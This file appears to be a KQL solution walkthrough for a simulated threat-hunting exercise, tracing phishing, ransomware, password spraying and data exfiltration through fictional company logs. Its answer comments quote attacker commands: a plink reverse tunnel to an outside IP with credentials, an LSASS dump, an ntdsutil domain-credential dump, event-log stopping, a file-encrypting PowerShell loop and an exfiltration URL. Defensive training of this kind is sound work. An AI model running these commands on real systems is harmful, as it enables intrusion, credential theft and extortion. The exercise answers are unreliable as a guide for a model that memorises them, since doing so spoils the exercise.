// Domination Nation

/////////////////// Section 1: KQL 101 ///////////////////
//////////////////////////////////////////////////////////

// Q2 - How many employees are in the company?
Employees
| count 


// Q3 - Each employee at WDN Consulting is assigned an IP address. Which employee has the IP address: “10.10.0.40”?
Employees
| where ip_addr == "10.10.0.40"
// Accidently click the skip button . sigh...
// Tanisha ODonoghue 

// Q4 - How many emails did Gloria Gould receive?
let gloria_email = 
Employees
| where name == "Gloria Gould"
| distinct email_addr;
Email
| where recipient in (gloria_email)
| count

// Q5 - How many distinct senders were seen in the email logs from kayseeseven.com?
Email
| where sender contains "kayseeseven.com"
| distinct sender
| count 

// Q6 - How many unique websites did “Judith Sower” visit?
let js_ip = 
Employees
| where name == "Judith Sower"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (js_ip)
| distinct url
| count

// Q7 - How many domains in the PassiveDns records contain the word “crypto”?
PassiveDns
| where domain contains "crypto"
| distinct domain
| count 

// Q8 - What IPs did the domain “cryptocoin.net” resolve to (enter any one of them)?
PassiveDns
| where domain contains "cryptocoin.net"
| distinct  ip
// 22.160.111.66 - 193.46.203.153 - 218.51.95.7

// Q9 - How many unique URLs were browsed by employees named “Karen”?
let karens_ips =
Employees
| where name has "Karen"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (karens_ips)
| distinct url
| count 


/////////////////// Section 2: Something Phishy ///////////////////
///////////////////////////////////////////////////////////////////

// Q1 - You notice that several security alerts were generated for a file named freebitcoin.exe. How many of these alerts were reported?
SecurityAlerts
| where  description contains "freebitcoin.exe"

// Q2 - When was the first alert reported?
// Same query as Q1
// 2023-06-05T13:16:37Z

// Q3 - Which host was this first alert associated with?
// Smae query 
// A suspicious file was detected on host QU09-DESKTOP. Filename: freebitcoin.exe. Sha256: 0e7e0e888f22b5cc83ce5f2560f9f331d89b8e02875e98ace822e074f2ee486b
// QU09-DESKTOP

// Q4 - Which employee does this host belong to?
Employees
| where hostname == "QU09-DESKTOP"
// James Reinhart - 10.10.4.70 - james_reinhart@wdnconsulting.com - jareinhart

// Q5 - Check the host for processes created around the time the alert was reported. One of these processes involves the system registry. What is this command?
ProcessEvents
| where hostname == "QU09-DESKTOP"
// ans: reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s - 2023-06-05T11:53:37Z
// Interesting: "powershell.exe" /c echo y | plink.exe -N -T -R 0.0.0.0:1251:127.0.0.1:3389 81.192.242.254 -P 22 -l bitcoinminer -pw Crypto$123 -no-antispoof

// Q6 - This command (the one from Q5) is used to get information about all the __ that has been installed using Windows Installer on the system.
// programs

// Q7 - A few minutes after this command was run, ipconfig was used to retrieve information about the network configuration of the system. What parameter/switch was used with ipconfig? 
// /all

// Q8 - Several other commands were run on this host around the time freebitcoin.exe appeared, including: whoami, net use, systeminfo, and arp -a.
// These commands likely represent what MITRE ATT&CK tactic?
// Discovery (TA0007)

// Q9 - The adversary may have used a tool to establish a tunnel to remote infrastructure. What is the name of the tool used on this host to establish a tunnel?
// plink
// I saw it earliert

// Q10 - What IP address did this tool connect to?
// 81.192.242.254
// see Q5

// Q11 - What password was used to establish the tunnel?
// Crypto$123

// Q12 - What was the name of the file created on this host shortly before freebitcoin.exe was created?
FileCreationEvents
| where hostname == "QU09-DESKTOP"
| where filename contains "free"
// 2023-06-05T13:10:22Z

FileCreationEvents
| where hostname == "QU09-DESKTOP"
// ans: HaveYouHeardAboutDogeCoin.docx
// Interesting GIVE_US_YOUR_BITCOIN.txt

// Q13 - What is the SHA256 hash of this file?
// a8145d4fd1534976e060cf8d0e4e206cda61d53f3d3c7f8bb29874532fef8d72

// Q14 - Wht is the name of the process that created this file?
// edge.exe

// Q15 - Hmmm. If an internet browser created the file maybe it was downloaded from somewhere. Check the browsing logs. What URL did this employee click to download the file?
OutboundNetworkEvents
| where src_ip == "10.10.4.70"
| where url contains ".docx"
// http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx - 2023-06-05T13:09:30Z

// Q16 - Maybe the user clicked on this link because it was sent to them in an email. What email address was used to send this link to the user?
Email
| where link has "http://forex-monero.com/files/HaveYouHeardAboutDogeCoin.docx"
// freedom@hotmail.com

// Q17 - What was the subject line of this email?
// [EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.

// Q18 - That subject line definitely looks suspicious. This likely represents a __ attack.
// phising

// Q19 - What was the verdict for this email?
// CLEAN

// Q20 - How many other users received emails from this sender email address?
Email
| where sender == "freedom@hotmail.com"

// Q21 - When was the first email sent from this sender?
// Prev query
// 2023-06-05T12:59:06Z


// Q22 - When was the last email sent from this sender?
// 2023-08-02T11:58:16Z
// same query

// Q23 - How many different email subjects were used by this sender?
Email
| where sender == "freedom@hotmail.com"
| distinct subject

// Q24 - Which subject line was used by this sender to target the most employees?
Email
| where sender == "freedom@hotmail.com"
| summarize count()by subject
// [EXTERNAL] [IMPORTANT] High-Priority Message: Secure Your Bitcoin Holdings.

// Q25 - How many total employees received emails with the subjects you found in question 23?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
Email
| where subject in (subs)
| distinct recipient
| count

// Q26 - How many total employees received emails from this threat actor?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
Email
| where sender in (TA_emails)
| distinct recipient
| count

// Q27 - How many distinct domains did the actor use in their emails?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
Email
| where sender in (TA_emails)
| extend Domain = extract(@"https?://([^/]+)", 1, link)
| distinct Domain
| count 

// Q28 - Which of the domains used by the actor was used most often?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
Email
| where sender in (TA_emails)
| extend Domain = extract(@"https?://([^/]+)", 1, link)
| summarize count()by Domain
// bro-monero.com

// Q29 - How many total IPs did the domains used by the actor resolve to?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
let TA_domains =
Email
| where sender in (TA_emails)
| extend Domain = extract(@"https?://([^/]+)", 1, link)
| distinct Domain;
PassiveDns
| where domain in (TA_domains)
| distinct ip


// Q30 - How many total domains were hosted on these IPs?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
let TA_domains =
Email
| where sender in (TA_emails)
| extend Domain = extract(@"https?://([^/]+)", 1, link)
| distinct Domain;
let TA_ips =
PassiveDns
| where domain in (TA_domains)
| distinct ip;
PassiveDns
| where ip in (TA_ips)
| distinct domain

// Q31 - Which IP hosted the most actor domains?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
let TA_domains =
Email
| where sender in (TA_emails)
| extend Domain = extract(@"https?://([^/]+)", 1, link)
| distinct Domain;
let TA_ips =
PassiveDns
| where domain in (TA_domains)
| distinct ip;
PassiveDns
| where ip in (TA_ips)
| summarize count()by ip
// 135.55.0.219

// Q32 - How many domains are hosted on that IP?
PassiveDns
| where ip == "135.55.0.219"
| distinct domain
| count 

// Q33 - How many devices in our environment tunneled to one of these known actor IPs?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
let TA_domains =
Email
| where sender in (TA_emails)
| extend Domain = extract(@"https?://([^/]+)", 1, link)
| distinct Domain;
let TA_ips =
PassiveDns
| where domain in (TA_domains)
| distinct ip;
ProcessEvents
| where process_commandline has_any (TA_ips)
| distinct hostname
| count

// Q34 - Which actor IP was tunneled to by 9 hosts?
let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
let TA_domains =
Email
| where sender in (TA_emails)
| extend Domain = extract(@"https?://([^/]+)", 1, link)
| distinct Domain;
let TA_ips =
PassiveDns
| where domain in (TA_domains)
| distinct ip;
ProcessEvents
| where process_commandline has_any (TA_ips)
| summarize count() by process_commandline
// 193.46.203.153

// Q35 - Which IP did anbartlett's host tunnel to?
Employees
| where username has "anbartlett"
// KIHE-MACHINE 

let subs = 
Email
| where sender == "freedom@hotmail.com"
| distinct subject;
let TA_emails =
Email
| where subject in (subs)
| distinct sender;
let TA_domains =
Email
| where sender in (TA_emails)
| extend Domain = extract(@"https?://([^/]+)", 1, link)
| distinct Domain;
let TA_ips =
PassiveDns
| where domain in (TA_domains)
| distinct ip;
ProcessEvents
| where process_commandline has_any (TA_ips)
| where hostname == "KIHE-MACHINE"
// 2023-06-22T15:35:37Z

// Q36 - Which command did the attackers run to stop the Windows Event Log Service?
ProcessEvents
| where hostname == "KIHE-MACHINE"
| where process_commandline contains "event"
// net stop eventlog /y - 2023-08-10T16:20:55Z

// Q37 - Shortly after this, the attackers modified a registry entry to disable a Windows feature. . Which tool was it?
ProcessEvents
| where hostname == "KIHE-MACHINE"
// It was the immediate next entry
// 2023-08-10T16:41:47Z
// reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

// Q38 - Next, the attackers used sc to change the startup behavior of a service..
// Which service was it?
// Same query
// sc config TermService start= auto

// Q39 - Which command did the attackers then use to encrypt files?
ProcessEvents
| where hostname == "KIHE-MACHINE"
// powershell.exe -c "Get-ChildItem C:\ -File -Recurse | Foreach-Object { $_.FullName } | ForEach-Object { Encrypt-File $_ }"
// 2023-08-10T17:06:59Z

// Q40 - In what kind of attack does an adversary encrypt a victim's files?
// ransomware

// Q41 - What is the name of this file?
FileCreationEvents
| where hostname == "KIHE-MACHINE"
// GIVE_US_YOUR_BITCOIN.txt
// 2023-08-10T16:33:25Z

// Q42 - What is the SHA256 hash of this file?
// sha256 - 1f9d90d4a6145cfc4061a5a19004f951c2e2e5fb57ce69ccf8e516f524e2e669
// same query

// Q43 - On how many unique hosts was this file seen?
FileCreationEvents
| where filename == "GIVE_US_YOUR_BITCOIN.txt"
| distinct hostname
| count 

// Q44 - On what date was this file seen in our environment?
// ans in Q41

// Q45 - Let's look at all the affected hosts. How many different employee roles were affected by this?
let infected = 
FileCreationEvents
| where filename == "GIVE_US_YOUR_BITCOIN.txt"
| distinct hostname;
Employees
| where hostname in (infected)
| distinct role
| count

// Q46 - Which employee role was most affected by the ransomware attack?
let infected = 
FileCreationEvents
| where filename == "GIVE_US_YOUR_BITCOIN.txt"
| distinct hostname;
Employees
| where hostname in (infected)
| summarize count()by role

// Q47 - One IT analyst was affected. What is this employee's name?
let infected = 
FileCreationEvents
| where filename == "GIVE_US_YOUR_BITCOIN.txt"
| distinct hostname;
Employees
| where hostname in (infected)
| where role == "IT Analyst"
// Walter Gomez - 10.10.0.124 - walter_gomez@wdnconsulting.com


/////////////////// Section 3: Gettign Smarter ///////////////////
//////////////////////////////////////////////////////////////////

// Q1 - Robert Russell reported seeing prompts for failed logins against his account, your manager wants you to investigate. What IP address does Robert usually use to login to his mail account?
Employees
| where name == "Robert Russell"
// 10.10.4.55 - rorussell

// Q2 - What is the most common public IP used by Robert Russell?
AuthenticationEvents
| where username == "rorussell"
| summarize count()by src_ip

// Q3 - What user agent did Robert show when logging in from that public IP? 
AuthenticationEvents
| where username == "rorussell"
| where src_ip == "48.147.171.98"
// Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0

// Q4 - What is Robert Russell typical user agent (per the Employees table)? Just enter the last piece (e.g. Firefox/##.#
AuthenticationEvents
| where username == "rorussell"
| where src_ip == "10.10.4.55"

// Q5 - What is the second most common user agent that we see being used to login to Russell's account? Just enter the last piece (e.g. Firefox/##.#)
AuthenticationEvents
| where username == "rorussell"
| summarize count()by user_agent

// Q6 - How many different IPs were used in attempted logins to Russell's account via that second user agent?
AuthenticationEvents
| where username == "rorussell"
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| distinct src_ip
| count

// Q7 - How many of those attempted logins succeeded?
AuthenticationEvents
| where username == "rorussell"
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"

// Q8 - How many different passwords were tried against Russell's accounts via that second user agent?
AuthenticationEvents
| where username == "rorussell"
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| distinct password_hash
| count

// Q9 - It looks like a malicious actor is trying to guess a bunch of passwords against Russell's account. This is known as a _ attack.


// Q10 - How many different accounts did the threat actor try this attack against?
AuthenticationEvents
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| distinct username
| count

// Q11 - How many accounts were successfully logged into via that user agent?
AuthenticationEvents
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| where result == "Successful Login"
| count 


// Q12 - What is the username of the first user to be compromised in this password spray?
AuthenticationEvents
| where user_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0"
| where result == "Successful Login"
// mibohringer - 2023-06-09T12:03:56Z

// Q13 - When was that user compromised? (Copy and paste the timestamp)
// above query

// Q14 - Let's investigate what happened after that user was compromised. 3 days later, the attacker ran a discovery command on that first victim's machine to find out who they are. What is this 6-letter command?
// whoami
// just guested w/o looking. this is the usua approach.

// Q15 - We don't see much more suspicious activity on this machine afterwards. Perhaps the actor decided to focus elsewhere. Let's look at another one of the accounts that was sprayed - caanderson. What is this user's hostname?
// caanderson
Employees
| where username  == "caanderson"
// 10.10.4.26 - Q68K-MACHINE


// Q16 - It looks like the actor may have dumped credentials from this user's machine. What command did the attacker run to dump credentials?
// 2023-06-30T19:38:15Z
ProcessEvents
| where hostname == "Q68K-MACHINE"
// procdump.exe -accepteula -r -ma lsass.exe lsass.dmp

// Q17 - Maybe the attackers dumped credentials here to gain access to an account with elevated permissions. What is the username of the admin account that logged into this host?
AuthenticationEvents
| where hostname == "Q68K-MACHINE"
| distinct username

// Q18 - How many hosts did this account attempt to log into?
AuthenticationEvents
| where username == "lifehack_local_admin"
| distinct hostname
| count

// Q19 - On how many hosts were those logins successful?
AuthenticationEvents
| where username == "lifehack_local_admin"
| where result == "Successful Login"
| distinct hostname
| count 

// Q 20 - How many total hosts did the attackers dump credentials on?
ProcessEvents
| where process_commandline == "procdump.exe -accepteula -r -ma lsass.exe lsass.dmp"
| distinct hostname
| count 

// Q21 - How many local admin accounts logged into these hosts?
let comp_hosts=
ProcessEvents
| where process_commandline == "procdump.exe -accepteula -r -ma lsass.exe lsass.dmp"
| distinct hostname;
AuthenticationEvents
| where hostname in  (comp_hosts)
| where username has "admin"
| distinct username
// all except domain_admin

// Q22 - Now, let's see if any other privileged accounts logged into these hosts. How many domain admins logged into all of these hosts that had credentials dumped on them?
// from previous query

// Q23 - What is the username of this domain admin account?
// ditto

// Q24 - If domain admin credentials were stolen by the actor, they may have compromised more devices within our environment. What is the hostname of the server logged into by this domain admin?
AuthenticationEvents
| where username == "cacapley_domain_admin"
// DOMAIN_CONTROLLER_01

// Q25 - Let's inspect that host more closely for suspicious activity. The attackers used mkdir on this host to create a new directory. What is the full path of the directory they created?
ProcessEvents
| where hostname == "DOMAIN_CONTROLLER_01"
// C:\Windows\Temp\Ntds_dit

// Q26 - The attackers ran a command on this host to dump directory-wide credentials.
// What was the full command?
// prev query
// ntdsutil "ac i ntds "ifm" "create full C:\Windows\Temp\Ntds_dit" q q 

// Q27 - If the attackers gained access to the domain controller, they could have used group policy to push malicious code organization-wide. What command can be used to force update the group policy on an endpoint?
// Looked it up
// gpupdate /force


// Q28 - How many hosts was the gpupdate command run on?
ProcessEvents
| where process_commandline contains "gpupdate /force"
| distinct hostname

// Q29 - Okay, that's a lot of hosts. There could be a lot of impact here. But uh oh, it looks like the CEO's host was one of the ones possibly affected. What is the CEO's hostname?
Employees
| where role == "CEO"
// Tennisha Martin - ODWU-LAPTOP

// Q30 - What time was the group policy update command run on this host?
ProcessEvents
| where hostname == "ODWU-LAPTOP"
| where process_commandline contains "gpupdate"
// 2023-07-17T16:03:40Z

// Q31 - A few days after the group policy update on this host, a strange powershell command was run. What encoding scheme is used in this command?
// guest w/o a query because the trend is the same more or less. 

// Q32 - Decode this encoded command. What is the destination URL in this decoded script?
ProcessEvents
| where hostname == "ODWU-LAPTOP"
| where process_commandline contains "bypass"
// $sourcePath = 'C:\Users\Desktop\temartin\exfil\'  # Source folder
// $destinationURL = 'http://hire.xyz/exfil/'  # Destination URL


// Q33 - What is the source path in this decoded script?
// prev query

// Q34 - Check for a file on this host in the path you found in Q33. What is the Sha256 hash of this file?
FileCreationEvents
| where hostname == "ODWU-LAPTOP"
| where path contains "C:\\Users\\Desktop\\temartin\\exfil\\"
// pretty bold
// STOLEN_FILES.zip

// Q35 - How many total hosts in the organization had similar file paths?
FileCreationEvents
| where filename == "STOLEN_FILES.zip"

// Q36 - How many unique employee roles had data exfiltrated from their devices?
let comp_usernames = 
FileCreationEvents
| where filename == "STOLEN_FILES.zip"
| distinct username;
Employees
| where username in (comp_usernames)
| distinct role
| count

// Q37 - It looks this actor was primarily interested in targeting high-value employees at our company. How many Directors of Operations were targeted?
let comp_usernames = 
FileCreationEvents
| where filename == "STOLEN_FILES.zip"
| distinct username;
Employees
| where username in (comp_usernames)
| summarize count()by role